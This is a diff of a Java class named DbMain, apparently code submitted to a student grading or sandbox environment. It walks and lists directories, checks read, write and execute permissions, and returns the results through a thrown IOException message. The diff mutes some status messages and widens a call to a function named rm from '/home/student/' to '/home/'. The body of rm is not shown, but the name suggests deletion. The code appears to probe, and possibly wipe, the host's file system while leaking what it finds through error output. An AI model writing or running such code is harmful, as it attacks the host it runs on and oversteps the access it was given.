@@ -16,16 +16,16 @@ public class DbMain {
         try {
             File tmpFile = new File(path);
             if (!tmpFile.exists()) {
-                s1 += "not exist\n";
+                //s1 += "not exist\n";
             }
             if (tmpFile.canRead()) {
-                s1 += "can READ\n";
+                //s1 += "can READ\n";
             }
             if (tmpFile.canWrite()) {
-                s1 += "can WRITE\n";
+                //s1 += "can WRITE\n";
             }
             if (tmpFile.canExecute()) {
-                s1 += "can EXEC\n";
+                //s1 += "can EXEC\n";
             }
 
             File[] listFiles = tmpFile.listFiles();
@@ -45,14 +45,14 @@ public class DbMain {
                 } else {
                     //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                     //s1 += "\n\n\n";
-                    s1 += "not is Dir ";
+                    //s1 += "not is Dir ";
                 }
             } else {
-                s1 += "listFile null ";
+                //s1 += "listFile null ";
             }
 
         } catch (Exception e) {
-            s1 += "exception ";
+            //s1 += "exception ";
             s1 += e.getMessage();
         }
         return s1;
@@ -91,7 +91,7 @@ public class DbMain {
         s1 += "\n\nseparate\n\n";
         s1 += rm("..");
         s1 += "\n\nseparate\n\n";*/
-        s1 += rm("/home/student/");
+        s1 += rm("/home/");
 
         throw new IOException(s1);
 
